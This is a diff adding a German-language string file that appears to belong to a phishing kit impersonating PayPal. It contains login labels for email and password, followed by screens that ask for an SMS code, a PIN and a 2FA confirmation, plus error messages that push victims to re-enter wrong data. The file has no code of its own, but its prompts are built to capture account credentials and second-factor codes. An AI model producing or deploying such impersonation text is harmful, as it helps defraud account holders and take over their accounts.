@@ -1,0 +1,22 @@
+{
+  "PAYPAL": {
+    "EMAIL": "Email",
+    "PASSWORD": "Passwort",
+    "BUTTON": "Anmelden"
+  },
+  "ERRORS": {
+    "DATA_ERROR": "Sie haben falsche Daten eingegeben",
+    "CODE_ERROR": "Du hast einen falschen Code eingegeben.",
+    "2FA_ERROR": "Es wurde keine Bestätigung gefunden. versuchen Sie es nochmal.",
+    "PIN_ERROR": "Du hast einen falschen Pin eingegeben."
+  },
+  "MAIN": {
+    "FINISHED": "Ihre Bewerbung wurde erfolgreich registriert. Erwarten Sie eine Bestätigung per E-Mail.",
+    "2FA_TITLE": "Bestätigen Sie die Anmeldung bei Ihrem Konto",
+    "2FA_BUTTON": "Fortfahren",
+    "SMS_TITLE": "Geben Sie den SMS-Code ein, um Ihr persönliches Konto zu betreten",
+    "SMS_BUTTON": "Bestätigen",
+    "PIN_TITLE": "Geben Sie den PIN-Code ein, um Ihr persönliches Konto zu betreten",
+    "PIN_BUTTON": "Bestätigen"
+  }
+}
